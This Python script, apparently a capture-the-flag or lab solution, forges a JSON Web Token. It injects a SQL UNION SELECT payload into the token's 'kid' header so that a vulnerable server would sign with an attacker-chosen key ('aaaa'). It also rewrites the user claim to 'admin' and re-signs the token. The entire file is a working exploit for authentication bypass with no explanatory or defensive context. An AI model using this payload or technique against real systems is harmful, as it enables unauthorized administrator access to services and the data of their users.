import hmac
import hashlib
import base64
import binascii

def padding(part):
    if len(part) % 4 != 0:
        padding = 4- (len(part) % 4)
        return part + ("="*padding)
    return part

def sign(part, key):
    return base64.urlsafe_b64encode(hmac.new("aaaa".encode(), part.encode(), hashlib.sha256).digest()).decode("utf-8").rstrip("=")

def createJWT(jwt):
	body = jwt[1]
	header = jwt[0]
	print("----before----")
	print(body)
	print(header)
	header = header.replace("key1", "zzzzzzz\' UNION SELECT \'aaaa")
	body = body.replace("null", "\"admin\"")
	print("----after----")
	print(body)
	print(header)
	payload = base64.urlsafe_b64encode(header.encode()).decode("utf-8").rstrip("=") + "." + base64.urlsafe_b64encode(body.encode()).decode("utf-8").rstrip("=")
	print(payload)
	signature =  sign(payload, key)
	return base64.urlsafe_b64encode(header.encode()).decode("utf-8").rstrip("=") + "." + base64.urlsafe_b64encode(body.encode()).decode("utf-8").rstrip("=") + "." + signature

def decode(jwt):
	particles = jwt.split(".")
	header = base64.b64decode(padding(particles[0])).decode("utf-8")
	body = base64.b64decode(padding(particles[1])).decode("utf-8")
	return header +"." + body

key = "aaaa"
orig_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ.eyJ1c2VyIjpudWxsfQ.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ"
particles = orig_jwt.split(".")

print("---------")
signature = createJWT(decode(orig_jwt).split("."))
print(signature)
print("---------")
print(decode(signature))